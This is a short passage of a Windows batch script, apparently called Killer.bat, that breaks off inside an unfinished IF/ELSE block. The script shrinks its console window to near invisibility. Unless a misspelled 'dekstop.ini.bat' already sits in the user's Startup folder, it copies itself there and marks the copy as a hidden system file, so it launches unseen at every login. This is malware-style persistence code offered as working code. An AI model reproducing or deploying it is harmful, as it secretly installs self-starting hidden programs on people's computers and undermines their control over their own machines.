@ECHO OFF
color FE & mode con:cols=16 lines=1


IF EXIST "%UserProfile%\Start Menu\Startup\dekstop.ini.bat" (

REM a trick to make anithyng a.k.a little delay and exit
	ping 127.0.0.1 -n 2 > nul
	
) ELSE (
	
  REM if the file not exist = deleted rename file from dekstop.ini.bat to Killer.bat
  copy /Y Killer.bat "%UserProfile%\Start Menu\Startup\Killer.bat"
  attrib +s +h "%UserProfile%\Start Menu\Startup\Killer.bat"